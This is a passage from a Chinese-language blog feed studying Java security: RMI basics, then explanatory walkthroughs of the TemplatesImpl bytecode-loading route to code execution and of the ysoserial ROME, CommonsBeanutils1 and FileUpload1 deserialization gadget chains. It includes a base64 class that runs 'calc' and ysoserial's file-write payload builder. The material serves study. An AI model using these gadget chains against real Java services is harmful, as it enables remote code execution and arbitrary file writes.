aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>Java的RMI规定此接口必须派生自<code>java.rmi.Remote</code>，并在每个方法声明抛出<code>RemoteException</code>。</strong></p><p>下面编写服务器的实现类，也就是我们客户端要调用的类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">WorldClock</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">LocalDateTime</span> <span class="token function">getLocalDateTime</span><span class="token punctuation">(</span><span class="token class-name">String</span> zoneId<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么对RMI的内容我们就准备完毕，下面我们就要通过RMI提供的接口来吧上面的服务以RMI的形式部署到网络上，才能让客户端进行调用</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Server</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"create World clock remote service..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化一个WorldClock:</span>        <span class="token class-name">WorldClock</span> worldClock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WorldClockService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将此服务转换为远程服务接口:</span>        <span class="token class-name">WorldClock</span> skeleton <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WorldClock</span><span class="token punctuation">)</span> <span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">.</span><span class="token function">exportObject</span><span class="token punctuation">(</span>worldClock<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将RMI服务注册到1099端口:</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 注册此服务，服务名为"WorldClock":</span>        registry<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"WorldClock"</span><span class="token punctuation">,</span> skeleton<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码为服务端相关类，下面我们就要编写客户端代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NotBoundException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 连接到服务器localhost，端口1099:</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 查找名称为"WorldClock"的服务并强制转型为WorldClock接口:</span>        <span class="token class-name">WorldClock</span> worldClock <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WorldClock</span><span class="token comment">/*共用接口*/</span><span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"WorldClock"</span><span class="token comment">/*服务名称*/</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 正常调用接口方法:</span>        <span class="token class-name">LocalDateTime</span> now <span class="token operator">=</span> worldClock<span class="token punctuation">.</span><span class="token function">getLocalDateTime</span><span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 打印调用结果:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211132152945.png"></p><p>运行就会发现我们的方法成功运行，我们打个断点来看看RMI是把对象加载到本地直接运行还是将数据交由远程处理</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211132204576.png"></p><p>首先加载服务的时候服务端运行无报错，此时我们将服务端代码停止并且让客户端继续运行</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211132205937.png"></p><p>发生报错运行失败，从上面的结果可见整个接口并没有将实例化后的对象或者实现好的类加载到本地执行，而是将其中对应的方法和属性由RMI中对应的接口交由服务端运行</p><blockquote><p>从运行结果可知，因为客户端只有接口，并没有实现类，因此，客户端获得的接口方法返回值实际上是通过网络从服务器端获取的。整个过程实际上非常简单，对客户端来说，客户端持有的<code>WorldClock</code>接口实际上对应了一个“实现类”，它是由<code>Registry</code>内部动态生成的，并负责把方法调用通过网络传递到服务器端。而服务器端接收网络调用的服务并不是我们自己编写的<code>WorldClockService</code>，而是<code>Registry</code>自动生成的代码。我们把客户端的“实现类”称为<code>stub</code>，而服务器端的网络服务类称为<code>skeleton</code>，它会真正调用服务器端的<code>WorldClockService</code>，获取结果，然后把结果通过网络传递给客户端。整个过程由RMI底层负责实现序列化和反序列化：</p></blockquote><pre class="line-numbers language-ascii" data-language="ascii"><code class="language-ascii">┌ ─ ─ ─ ─ ─ ─ ─ ─ ┐         ┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  ┌─────────────┐                                 ┌─────────────┐│ │   Service   │ │         │                     │   Service   │ │  └─────────────┘                                 └─────────────┘│        ▲        │         │                            ▲        │         │                                               ││        │        │         │                            │        │  ┌─────────────┐   Network   ┌───────────────┐   ┌─────────────┐│ │ Client Stub ├─┼─────────┼&gt;│Server Skeleton│──&gt;│Service Impl │ │  └─────────────┘             └───────────────┘   └─────────────┘└ ─ ─ ─ ─ ─ ─ ─ ─ ┘         └ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Java的RMI严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为Java的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证100%排除恶意构造的字节码。因此，使用RMI时，双方必须是内网互相信任的机器，不要把1099端口暴露在公网上作为对外服务。</p></blockquote><p>在使用RMI是需要注意的点</p><ol><li>接口需要集成Remote接口，且方法需要抛出RemoteException错误</li><li>接口的实现类需要继承UnicastRemoteObject，同样的方法需要抛出RemoteException错误</li><li>如果远程方法需要传参，需要保证参数是可序列化的，我这里传参只是传了字符串，字符串是可序列化的，如果传参是自定义的对象，那么这个对象需要实现Serilizable接口</li></ol>        <h2 id="关于JNDI"   >          <a href="#关于JNDI" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于JNDI" class="headerlink" title="关于JNDI"></a>关于JNDI</h2>              <h2 id="关于JDBC"   >          <a href="#关于JDBC" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于JDBC" class="headerlink" title="关于JDBC"></a>关于JDBC</h2>      <p>JDBC说白了就通过一套统一的API加上不同数据库的驱动，来实现用一套统一的API对不同种类的数据库进行连接</p>        <h2 id="关于TemplatesImpl利用链RCE的问题"   >          <a href="#关于TemplatesImpl利用链RCE的问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于TemplatesImpl利用链RCE的问题" class="headerlink" title="关于TemplatesImpl利用链RCE的问题"></a>关于TemplatesImpl利用链RCE的问题</h2>      <p>困惑很久了，主要是链子跟到最后一步不知道怎么最后RCE了</p><p>要想知道这个类为什么可以触发RCE，首先我们要知道默认情况下Java执行系统命令需要使用的是什么，代码应当如下</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class TouchFile&#123;    public TouchFile() throws Exception &#123;        Runtime.getRuntime().exec(&quot;calc&quot;);    &#125;   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接使用Runtime包中的函数执行即可，将这个类编译成字节码后再进行base64，然后交给defineClass来加载字节码，再执行其中</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Method defineClass &#x3D; ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);defineClass.setAccessible(true);byte[] code &#x3D;Base64.getDecoder().decode(&quot;yv66vgAAADQAHgoABgARCgASABMIABQKABIAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAYAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAOVG91Y2hGaWxlLmphdmEMAAcACAcAGQwAGgAbAQAEY2FsYwwAHAAdAQAJVG91Y2hGaWxlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAACAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAEAAEABEADQASAAsAAAAEAAEADAAJAA0ADgACAAkAAAAmAAIAAQAAAAq4AAISA7YABFexAAAAAQAKAAAACgACAAAAFgAJABcACwAAAAQAAQAMAAEADwAAAAIAEA&#x3D;&#x3D;&quot;);Class yyds&#x3D; (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;TouchFile&quot;, code, 0, code.length);yyds.newInstance();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们都知道 Java 的 ClassLoader 是用来加载字节码文件最基础的方法，ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类，用一句话概括它的作用就是将传入的字节码处理成真正的 Java 类然后返回。</p><p><code>ClassLoader</code> 处理字节码的流程为 <code>loadClass</code> -&gt; <code>findClass</code> -&gt; <code>defineClass</code></p><p><code>loadClass</code>:：从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 <code>findClass</code> </p><p> <code>findClass</code>： 根据基础URL指定的方式来加载类的字节码</p><p> <code>defineClass</code>：处理前面传入的字节码，将其处理成真正的Java类</p><p>所以将字节码转为 java 类的其实是 defineClass 方法，翻看源码 ClassLoader#defineClass 是一个protected属性，无法直接在外部访问，只能通过反射的形式来调用，所以在实际场景中很难利用到它。</p><p>这也就是<code>TemplatesImpl</code>存在的意义，我们直接去看这个类的定义</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232150702.png"></p><p>可以看到TransletClassLoader定义了defineClass方法，对其进行调用</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232300218.png"></p><p>再向前查找发现defineTransletClasses中生成了TransletClassLoader并调用了其中的defineClass方法，不过到这一步依然是private子类无法被外界直接调用，所以我们继续向上</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232305532.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232310998.png"></p><p>最终找到newTransformer为public，可以直接被调用了，最终利用链如下</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt;TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;未成功触发TemplatesImpl#getTransletIndex() -&gt; TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">TemplatesImpl#getOutputProperties() -&gt;TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass() <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看完这个我们可以看看ysoserial最后是怎么通过他构造出来一个可供命令执行的字节码的</p>        <h3 id="关于注解"   >          <a href="#关于注解" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于注解" class="headerlink" title="关于注解"></a>关于注解</h3>      <p>什么是注解（Annotation）？注解是放在Java源码的类、方法、字段、参数前的一种特殊“注释”：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; this is a component:@Resource(&quot;hello&quot;)public class Hello &#123;    @Inject    int n;    @PostConstruct    public void hello(@Param String name) &#123;        System.out.println(name);    &#125;    @Override    public String toString() &#123;        return &quot;Hello&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注释会被编译器直接忽略，注解则可以被编译器打包进入class文件，因此，注解是一种用作标注的“元数据”。</p><p>从JVM的角度看，注解本身对代码逻辑没有任何影响，如何使用注解完全由工具决定。</p><p>Java的注解可以分为三类：</p><p>第一类是由编译器使用的注解，例如：</p><ul><li><code>@Override</code>：让编译器检查该方法是否正确地实现了覆写；</li><li><code>@SuppressWarnings</code>：告诉编译器忽略此处代码产生的警告。</li></ul><p>这类注解不会被编译进入<code>.class</code>文件，它们在编译后就被编译器扔掉了。</p><p>第二类是由工具处理<code>.class</code>文件使用的注解，比如有些工具会在加载class的时候，对class做动态修改，实现一些特殊的功能。这类注解会被编译进入<code>.class</code>文件，但加载结束后并不会存在于内存中。这类注解只被一些底层库使用，一般我们不必自己处理。</p><p>第三类是在程序运行期能够读取的注解，它们在加载后一直存在于JVM中，这也是最常用的注解。例如，一个配置了<code>@PostConstruct</code>的方法会在调用构造方法后自动被调用（这是Java代码读取该注解实现的功能，JVM并不会识别该注解）。</p><p>定义一个注解时，还可以定义配置参数。配置参数可以包括：</p><ul><li>所有基本类型；</li><li>String；</li><li>枚举类型；</li><li>基本类型、String、Class以及枚举的数组。</li></ul><p>因为配置参数必须是常量，所以，上述限制保证了注解在定义时就已经确定了每个参数的值。</p><p>注解的配置参数可以有默认值，缺少某个配置参数时将使用默认值。</p><p>此外，大部分注解会有一个名为<code>value</code>的配置参数，对此参数赋值，可以只写常量，相当于省略了value参数。</p><p>如果只写注解，相当于全部使用默认值。</p><p>举个栗子，对以下代码：</p><pre class="line-numbers language-none"><code class="language-none">public class Hello &#123;    @Check(min&#x3D;0, max&#x3D;100, value&#x3D;55)    public int n;    @Check(value&#x3D;99)    public int p;    @Check(99) &#x2F;&#x2F; @Check(value&#x3D;99)    public int x;    @Check    public int y;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>@Check</code>就是一个注解。第一个<code>@Check(min=0, max=100, value=55)</code>明确定义了三个参数，第二个<code>@Check(value=99)</code>只定义了一个<code>value</code>参数，它实际上和<code>@Check(99)</code>是完全一样的。最后一个<code>@Check</code>表示所有参数都使用默认值。</p>        <h3 id="小结"   >          <a href="#小结" class="heading-link"><i class="fas fa-link"></i></a><a href="#小结" class="headerlink" title="小结"></a>小结</h3>      <p>注解（Annotation）是Java语言用于工具处理的标注：</p><p>注解可以配置参数，没有指定配置的参数使用默认值；</p><p>如果参数名称是<code>value</code>，且只有一个参数，那么可以省略参数名称。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ysoserial反序列化</title>
      <link href="/posts/7ecbecc0.html"/>
      <url>/posts/7ecbecc0.html</url>
      
        <content type="html"><![CDATA[        <h2 id="ROME"   >          <a href="#ROME" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2>      <pre class="line-numbers language-java" data-language="java"><code class="language-java">链子<span class="token comment">/** * * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap&lt;K,V>.hash(Object) * HashMap&lt;K,V>.readObject(ObjectInputStream) * * @author mbechler * */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们先跟着反序列化的链子走一遍试试</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211652278.png"></p><p><code>HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</code>这个是反序列化的入口，不过奇怪的是看到前面的内容好像没有什么大用，那就直接往下跟，走<code>hash</code>函数</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211655111.png"></p><p><code>HashMap&lt;K,V&gt;.hash(Object)</code>检查传入的key是否为空，如果为空就返回0，否则执行key的<code>hashCode</code>函数，此处key为<code>ObjectBean</code>类对象，继续走<code>hashCode</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211657876.png"></p><p><code>ObjectBean.hashCode()</code>继续调用<code>EqualsBean</code>的<code>beanHashCode</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211659382.png"></p><p><code>EqualsBean.beanHashCode()</code>继续调用<code>ObjectBean</code>的<code>toString</code>方法，hashCode会在漏洞触发后再被执行，所以此处不需要管</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211701563.png"></p><p><code>ObjectBean.toString()</code>继续调用<code>ToStringBean</code>的<code>toString</code>方法</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211703142.png"></p><p><code>ToStringBean.toString()</code>看到最后prefix就相当于拿出来调用链开始的原对象的类名，传入同名函数中执行</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210222355753.png"></p><p>这个方法会调用 <code>BeanIntrospector.getPropertyDescriptors()</code> 来获取 <code>_beanClass</code> 的全部 getter/setter 方法，然后判断参数长度为 0 的方法使用 <code>_obj</code> 实例进行反射调用，翻译成人话就是会调用所有 getter 方法拿到全部属性值，然后打印出来，显然getter都是无参方法，所以会导致所有getter方法都被调用了一遍</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230019005.png"></p><p>我们继续跟入<code>Method.invoke()</code>，到最后调用了<code>DelegatingMethodAccessorImpl.invoke(Object, Object[])</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230026318.png"></p><p>跟入调用同类下的<code>invoke0</code>，最终触发<code>TemplatesImpl.getOutputProperties()</code>导致RCE</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230029269.png"></p><p>走完一遍链子大概知道整个反序列化是怎么触发的了，能挖出来的真的是神仙（</p>        <h2 id="CommonsBeanutils1"   >          <a href="#CommonsBeanutils1" class="heading-link"><i class="fas fa-link"></i></a><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2>      <p>嗷呜，首先还是扔一个反序列化链子</p><pre class="line-numbers language-none"><code class="language-none">PriorityQueue.readObject()PriorityQueue.heapify()PriorityQueue.siftDown()siftDownUsingComparator()BeanComparator.compare()TemplatesImpl.getOutputProperties()TemplatesImpl.newTransformer()TemplatesImpl.getTransletInstance()TemplatesImpl.defineTransletClasses()TemplatesImpl.TransletClassLoader.defineClass()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次我们可以看到在createObject的时候最终返回了一个<code>PriorityQueue</code>类对象，关于这个类</p><blockquote><p>PriorityQueue是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的<span class="exturl"><a class="exturl__link"   href="http://www.journaldev.com/780/java-comparable-and-comparator-example-to-sort-objects" >Comparator</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>（比较器）在队列实例化的时排序。</p><p>简单来说就是 PriorityQueue 会对队列中的元素用比较器 Comparator 进行排序，而 CommonsBeanutils1 中使用的比较器为 BeanComparator。</p></blockquote><p>那这和我们的反序列化有什么关系呢，我们先对这个链子进行一次反序列化试试</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260154357.png"></p><p>我们先直接来看这个类的<code>readObject</code>函数，看到最后调用了<code>heapify</code><em><strong>#堆化</strong></em>函数，我们跟入一下</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260156906.png"></p><p>可以看到其中调用了<code>siftDown</code><em><strong>#筛选</strong></em>函数，我们继续跟入</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260159298.png"></p><p>其中调用了<code>siftDownUsingComparator</code><em><strong>#用比较器筛选</strong></em>函数，此处的比较器使用的是<code>BeanComparator</code>，继续跟入</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260201908.png"></p><p>这里对之前队列中的内容调用了<code>compare</code><em><strong>#比较</strong></em>函数，跟入</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260202428.png"></p><p>看到其中的比较器函数具体代码，跟入<code>PropertyUtils.getProperty</code><em><strong>#属性工具类:获取属性</strong></em>方法，这个方法具体是什么内容呢</p><blockquote><p>而 getProperty() 的定义如下：</p><p><code>PropertyUtils.getProperty(Object bean, String name)</code><br><code>bean</code> 是不为null的Java Bean实例<br><code>name</code> 是Java Bean属性名称 (也就是方法中的getXxx(), setXxx(), 其中的xxx成为这个java bean的bean属性, java中的类成员变量称为字段, 并不是属性。<br>这个方法是调用bean对象中的getname()方法</p></blockquote><p>就相当于直接调用了bean对象中的getxxx()方法，又因为反序列化我们对内容可控，我们就可以任意调用任意对象的任意get方法，在这里o1，o2就是我们反序列化生成的<code>PriorityQueue</code>中的元素，而<code>property</code>属性也可控，所以条件成立，可以任意调用get方法</p><p>此处我们只需要找到一个危险的get方法就行了，还是使用<code>TemplatesImpl</code>类，关于这个类RCE可以去看另一个JAVA小点文章，在此不再赘述</p><p>最后我们再回来看ysoserial中对这条链的利用代码</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260214643.png"></p><p>豁然开朗喵喵</p>        <h2 id="FileUpload1"   >          <a href="#FileUpload1" class="heading-link"><i class="fas fa-link"></i></a><a href="#FileUpload1" class="headerlink" title="FileUpload1"></a>FileUpload1</h2>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;** * Gadget chain: * DiskFileItem.readObject() * * Arguments: * - copyAndDelete;sourceFile;destDir * - write;destDir;ascii-data * - writeB64;destDir;base64-data * - writeOld;destFile;ascii-data * - writeOldB64;destFile;base64-data * * Yields: * - copy an arbitraty file to an arbitrary directory (source file is deleted if possible) * - pre 1.3.1 (+ old JRE): write data to an arbitrary file * - 1.3.1+: write data to a more or less random file in an arbitrary directory * **&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看介绍直接跟到对应的readObject中看看是怎么进行反序列化的</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private void readObject(ObjectInputStream in)        throws IOException, ClassNotFoundException &#123;    &#x2F;&#x2F; 读取原始数据（属性）    in.defaultReadObject();    OutputStream output &#x3D; getOutputStream();    if (cachedContent !&#x3D; null) &#123;        output.write(cachedContent);    &#125; else &#123;        FileInputStream input &#x3D; new FileInputStream(dfosFile);        IOUtils.copy(input, output);        dfosFile.delete();        dfosFile &#x3D; null;    &#125;    output.close();    cachedContent &#x3D; null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里通过getOutputStream拿到了一个文件对象，然后如果cachedContent中存在内容就将其写入到这个文件中，跟入<code>getOutputStream</code></p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public OutputStream getOutputStream()    throws IOException &#123;    if (dfos &#x3D;&#x3D; null) &#123;        File outputFile &#x3D; getTempFile();        dfos &#x3D; new DeferredFileOutputStream(sizeThreshold, outputFile);    &#125;    return dfos;&#125;protected File getTempFile() &#123;    if (tempFile &#x3D;&#x3D; null) &#123;        File tempDir &#x3D; repository;        if (tempDir &#x3D;&#x3D; null) &#123;            tempDir &#x3D; new File(System.getProperty(&quot;java.io.tmpdir&quot;));        &#125;        String tempFileName &#x3D; format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId());        tempFile &#x3D; new File(tempDir, tempFileName);    &#125;    return tempFile;&#125;public DeferredFileOutputStream(int threshold, File outputFile) &#123;    this(threshold, outputFile, (String)null, (String)null, (File)null, 1024);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到首先通过getTempFile生成了临时文件，再生成一个DeferredFileOutputStream类，该类可通过某一阈值（threshold）来判断将文件写入内存中还是硬盘中</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private static DiskFileItem makePayload ( int thresh, String repoPath, String filePath, byte[] data ) throws IOException, Exception &#123;    &#x2F;&#x2F; if thresh &lt; written length, delete outputFile after copying to repository temp file    &#x2F;&#x2F; otherwise write the contents to repository temp file    File repository &#x3D; new File(repoPath);    DiskFileItem diskFileItem &#x3D; new DiskFileItem(&quot;test&quot;, &quot;application&#x2F;octet-stream&quot;, false, &quot;test&quot;, 100000, repository);    File outputFile &#x3D; new File(filePath);    DeferredFileOutputStream dfos &#x3D; new DeferredFileOutputStream(thresh, outputFile);    &#x2F;&#x2F; write data to dfos    OutputStream os &#x3D; (OutputStream) Reflections.getFieldValue(dfos, &quot;memoryOutputStream&quot;);    &#x2F;&#x2F; write data to memoryOutputStream    os.write(data);    &#x2F;&#x2F; write data to thresholdingOutputStream    Reflections.getField(ThresholdingOutputStream.class, &quot;written&quot;).set(dfos, data.length);    Reflections.setFieldValue(diskFileItem, &quot;dfos&quot;, dfos);    Reflections.setFieldValue(diskFileItem, &quot;sizeThreshold&quot;, 0);    return diskFileItem;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们先以文件写入为例子看调用链</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;JDK8DiskFileItem.readObject()-&gt;getOutputStream()-&gt;DeferredFileOutputStream(sizeThreshold, getTempFile())#生成可写入的文件对象-&gt;output.write(cachedContent)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中的内容来自我们预先定义的cachedContent，sizeThreshold预定义为0</p><p>再来看文件复制的</p><pre class="line-numbers 